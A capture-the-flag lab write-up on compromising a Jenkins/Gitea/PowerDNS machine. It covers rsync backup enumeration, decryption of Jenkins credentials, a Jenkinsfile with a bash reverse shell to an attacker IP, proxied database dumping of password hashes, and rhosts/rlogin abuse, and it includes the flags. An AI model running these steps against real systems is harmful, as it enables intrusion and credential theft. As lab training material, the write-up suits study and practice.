
**Scan** : 

```sh
22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 472173e26b96cdf91311af40c84dd67f (ECDSA)
|_  256 2b5ebaf372d3b309df25412909f47bf5 (ED25519)
53/tcp   open     domain          PowerDNS
| dns-nsid:
|   NSID: pdns (70646e73)
|_  id.server: pdns
512/tcp  open     exec            netkit-rsh rexecd
513/tcp  open     login?
514/tcp  open     shell           Netkit rshd
873/tcp  open     rsync           (protocol version 31)
3000/tcp open     ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=403cb3e3906068db; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=GYHXs7TQdbOzsKcKny30oR8By-Q6MTcyMTI0MjAwODM2MTMwNzAzNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 17 Jul 2024 18:46:48 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a275bfd19692210f; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=7aCFYOoWpGjTrCHOLcNbUFcmXws6MTcyMTI0MjAxMzU0Mjg2OTg2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 17 Jul 2024 18:46:53 GMT
|_    Content-Length: 0
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap


```

Enumerating shared folder: 

```sh
nmap -sV --script "rsync-list-modules" -p 873 $target
```

Or

```sh
nc -vn $target 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
```

Download File : 

```sh
rsync -av rsync://10.10.71.22/backups/jenkins.tar.gz .
```

Interesting file in Users/Admin_/config.xml: 

```sh
<hudson.security.HudsonPrivateSecurityRealm_-Details><passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG
</passwordHash>
</hudson.security.HudsonPrivateSecurityRealm_-Details>
```

Password cracking : 
```sh
hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
```
too long ... 

SO i used a tool : 
```sh

/go/bin❯ ./go-decrypt-jenkins -d ../../Downloads/jenkins_configuration/
Searching for files in ../../Downloads/jenkins_configuration/
id: e4048737-7acd-46fd-86ef-a3db45683d4f
username: buildadm
password: Git1234!
usernameSecret: false

id: admin
name: admin
passwordHash: #jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG
```

- Then modify the Jenkinsfile  and the add a reverse shell : 
```sh
pipeline {
    agent any

    stages {
        stage('Pwned') {
            steps {
                sh '''
                    bash -c 'bash -i >& /dev/tcp/10.8.3.12/4242 0>&1'
                '''
            }
        }
    }
}
```

- Then got the flag in /root/user.txt:
```flag
VL{bf760d7c76f89f4e07bf4d461ee1c3c2}
```

- If we remember we got two filtered ports : `3306 & 8081` . So we going to do a proxychains to access to them because of the firewall .
```sh
export TERM=xterm-256color
```

- Access to MariaDB and list content : 
```sh
proxychains -q mysql -h 10.10.125.92 -u root -P 3306
SHOW DATABASE;
SHOW tables from powerdnsadmin;
SHOW columns FROM powerdnsadmin.user;
SELECT * FROM powerdnsadmin.user;
```

- Got some credential : 
```sh
1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | 

winston
```
- More information : 
![[Build_lab.png]]

- We found Rhosts file with intern and admin so we add them to the powerDNSadmin
with our ip address: 
![[Build_lab2.png]]

- Then we can connect with rlogin : 
```sh
VL{fef779871842b0975faac0a289181ab2}
```

